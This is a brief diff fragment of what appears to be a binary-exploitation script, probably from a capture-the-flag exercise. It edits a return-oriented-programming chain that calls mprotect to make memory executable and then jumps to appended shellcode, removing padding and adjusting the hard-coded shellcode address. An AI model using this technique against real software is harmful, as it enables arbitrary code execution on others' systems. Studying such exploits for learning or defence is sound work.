@@ -81,8 +81,8 @@ rop += p64(7)
 rop += p64(pop_rax)
 rop += p64(10)                  # sys_mprotect
 rop += p64(syscall)
-rop += 'X'*8					# dummy
-rop += p64(0x7ffff7dd1ae0)  	# shellcode addr
+#rop += 'X'*8					# dummy
+rop += p64(0x7ffff7dd1ae0-0x8)  	# shellcode addr
 rop += p64(0)
 rop += asm(shellcode)
 
